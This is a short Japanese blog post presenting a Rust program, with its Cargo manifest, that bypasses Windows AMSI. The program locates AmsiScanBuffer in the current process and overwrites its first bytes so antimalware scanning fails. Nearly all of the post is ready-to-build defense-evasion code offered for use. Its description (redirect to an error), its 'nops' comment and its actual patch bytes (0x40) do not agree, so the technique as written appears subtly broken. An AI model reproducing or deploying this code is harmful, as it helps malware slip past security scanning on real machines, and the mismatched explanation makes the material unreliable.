---
title: "AMSI bypass"
date: "2023-10-11"
draft: "false"
---

スキャン要求を失敗させるために、すでにメモリにロードされているAMSI ライブラリ自体のコードを改ざんする.
メモリにすでにロードされている AmsiScanBuffer というライブラリを探し出し、そのアドレスの命令を上書きしてエラーメッセージを表示させます。この攻撃では、マルウェアがメモリ内のライブラリ「AmsiScanBuffer」を探し出し、そのアドレスの命令を、エラーメッセージにリダイレクトする新しい命令で上書きします。

```toml
[package]
name = "amsibypass"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
[[bin]]
name = "amsi_bypass"
path = "src/main.rs"

[dependencies]
winapi = {version = "0.3.9", features=["memoryapi", "libloaderapi", "processthreadsapi"]}
win32-error = "0.9.0"
```

```rs
use std::{ffi::CString, ptr};

use winapi::{
    um::{
    memoryapi::{
        VirtualProtect,
        WriteProcessMemory
    },
    libloaderapi::{
        LoadLibraryA,
        GetProcAddress
    },
    processthreadsapi::GetCurrentProcess, 
    winnt::PAGE_READWRITE
    }, 
    shared::{
        minwindef::{
            DWORD, 
            FALSE
        },
        ntdef::NULL
    }
};

fn main() {
    println!("[+] patching amsi for current process");

    unsafe {
        // Getting the address of AmsiScanBuffer.
        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
        let mut old_permissions: DWORD = 0;
        
        // Overwrite this address with nops.
        if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
            panic!("[-] Failed to change protection.");
        }
        let written: *mut usize = ptr::null_mut();

        if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
            panic!("[-] Failed to overwrite function.");
        }

        // Restoring the permissions.
        VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
        println!("[+] AmsiScanBuffer patched!");
    }
}
```